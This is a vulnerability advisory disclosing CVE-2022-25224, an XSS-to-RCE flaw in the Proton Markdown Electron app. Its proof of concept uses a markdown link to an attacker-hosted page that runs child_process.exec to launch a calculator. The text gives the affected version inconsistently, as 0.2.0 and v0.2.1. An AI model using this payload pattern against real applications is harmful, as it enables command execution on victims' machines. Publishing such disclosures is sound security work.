---
slug: advisories/lennon/
title: Proton v0.2.0 - XSS To RCE
authors: Oscar Uribe
writer: ouribe
codename: lennon
product: Proton v0.2.0
date: 2022-04-29 10:00 COT
cveid: CVE-2022-25224
severity: 7.1
description: Proton Markdown Version 0.2.0 - XSS Markdown Link To RCE
keywords: Fluid Attacks, Security, Vulnerabilities, Proton, XSS, RCE
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                         |                                                            |
|-------------------------|------------------------------------------------------------|
| **Name**                | Proton v0.2.0 - XSS To RCE                                 |
| **Code name**           | [Lennon](https://en.wikipedia.org/wiki/John_Lennon)        |
| **Product**             | Proton Markdown                                            |
| **Affected versions**   | Version 0.2.0                                              |
| **State**               | Public                                                     |
| **Release date**        | 2022-05-17                                                 |

## Vulnerability

|                       |                                                                                    |
|-----------------------|------------------------------------------------------------------------------------|
| **Kind**              | XSS to RCE                                                                         |
| **Rule**              | [010. Stored cross-site scripting (XSS)](https://docs.fluidattacks.com/criteria/vulnerabilities/010)   |
| **Remote**            | No                                                                                |
| **CVSSv3 Vector**     | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:N                                       |
| **CVSSv3 Base Score** | 7.1                                                                                |
| **Exploit available** | No                                                                                 |
| **CVE ID(s)**         | [CVE-2022-25224](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25224)                                                    |

## Description

Proton **v0.2.1** allows an attacker to create a malicious
link inside a markdown file. When the victim clicks the link,
the application opens the site in the current frame allowing
an attacker to host JavaScript code in the malicious link in
order to trigger an XSS attack. The `nodeIntegration` configuration
is set to **on** which allows the webpage to use `NodeJs` features,
an attacker can leverage this to run OS commands.

## Proof of Concept

### Steps to reproduce

1. Create a markdown file with the following content.

   ```javascript
   [Click me!!!](http://192.168.1.67:8002/rce.html)
   ```

2. Host the `rce.html` file with the following
   content on a server controlled by the attacker.

   ```javascript
    <script>
        require('child_process').exec('calc');
    </script>
   ```

3. Send the markdown file to the victim.
   When the victim clicks the markdown link the site
   will be open inside electron and the JavaScript
   code will spawn a calculator.

### System Information

* Version: Proton v0.2.1.
* Operating System: Windows 10.0.19042 N/A Build 19042.
* Installer: Proton.Setup.0.2.0.exe

## Exploit

There is no exploit for the vulnerability but can be manually exploited.

## Mitigation

By 2022-05-17 there is not a patch resolving the issue.

## Credits

The vulnerability was discovered by [Oscar
Uribe](https://co.linkedin.com/in/oscar-uribe-londo%C3%B1o-0b6534155) from the Offensive
Team of  `Fluid Attacks`.

## References

|                     |                                                                     |
|---------------------|---------------------------------------------------------------------|
| **Vendor page**     | <https://github.com/steventhanna/proton/>                           |

## Timeline

* 2022-04-29: Vulnerability discovered.

* 2022-04-29: Vendor contacted.

* 2022-05-17: Public disclosure.